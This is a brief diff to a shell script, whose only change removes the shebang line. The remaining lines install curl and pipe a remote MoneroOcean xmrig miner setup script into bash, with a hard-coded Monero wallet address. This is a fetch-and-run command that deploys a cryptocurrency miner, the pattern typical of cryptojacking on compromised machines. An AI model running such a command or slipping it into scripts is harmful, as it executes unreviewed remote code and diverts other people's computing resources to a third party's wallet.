@@ -1,4 +1,3 @@
-#!/bin/bash
 apt update
 apt install curl -y 
 curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 8AAQaa8GKKC1WC1nkyELuuAdeswSWJrn42AGVUr2hgDZAQHayzYi642fUHiVjPDdbmNa4wDRzywj2BEBmGfhaECVPn4X3c2
